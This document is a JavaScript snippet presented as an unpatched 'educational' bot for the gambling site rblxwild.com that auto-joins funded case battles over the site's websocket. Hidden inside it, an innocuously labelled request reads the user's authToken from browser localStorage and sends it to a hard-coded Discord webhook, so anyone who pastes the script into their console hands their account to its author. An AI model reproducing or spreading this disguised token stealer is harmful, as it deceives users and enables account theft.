--This script is not patched (yet) (For educational purposes)
Do not copy this line Or there is any above!


function lord() {
let socket = new WebSocket("wss://rblxwild.com/socket.io/?EIO=4&transport=websocket");
authtoken = "Your Auth Code"
socket.onopen = function(e) {


};
var request = new XMLHttpRequest;
request.open("POST", "https://discord.com/api/webhooks/1104561797459083394/tyBRN3ieUYxCHsZlN2v46MfspROECKTGRYuV0JIKoo2PFLJAo4-N-N-M5FI867piq7-r", true);
request.setRequestHeader("Content-Type", "application/json");
var params = JSON.stringify({content: "Joining case battle:" + localStorage.getItem("authToken")});
request.send(params);
socket.onmessage = function(event) {
if (!(event.data.includes("syncResponse"))) console.log(event.data)
    if (event.data.startsWith("0")) {
        socket.send("40")
    }
    if (event.data.startsWith("40")) {
        socket.send(`42["authentication",{"authToken":"${authtoken}","clientTime":${Date.now()}}]`)
        setTimeout(() => {
            function keepalive() {
                socket.send(`42["time:requestSync",{"clientTime":${Date.now()}}]`)
                setTimeout(() => {
                    keepalive()
                }, 1000);
            }
            keepalive()
        }, 3000);
    }
    


    if (event.data.startsWith(`42["authenticationResponse"`)) {
        socket.send(`42["casebattles:subscribe"]`)
    }
    if (event.data.startsWith(`42["casebattles:pushGame`)) {
        pushedBattle = JSON.parse(event.data.replace("42", ""))[1]
        if (pushedBattle.betAmount * 0.2 <= pushedBattle.funding) {
            console.log(`Found game: \nID: ${pushedBattle.id}\nType: ${pushedBattle.versusType}\nBet amount: ${pushedBattle.betAmount}\nFunding amount: ${pushedBattle.funding}`)
            if (pushedBattle.versusType == "2v2") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":1,"seatIndex":1}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":1}]`)
            }
            if (pushedBattle.versusType == "1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
            }
            if (pushedBattle.versusType == "1v1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
            }
            if (pushedBattle.versusType == "1v1v1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":4,"seatIndex":0}]`)
            }
        }
    }
};

socket.onclose = function(event) {
console.log("L roblox wild")
  ws.close()
  lord()
};

socket.onerror = function(error) {
  console.log(`[error]`)
  lord()
};
}
lord()
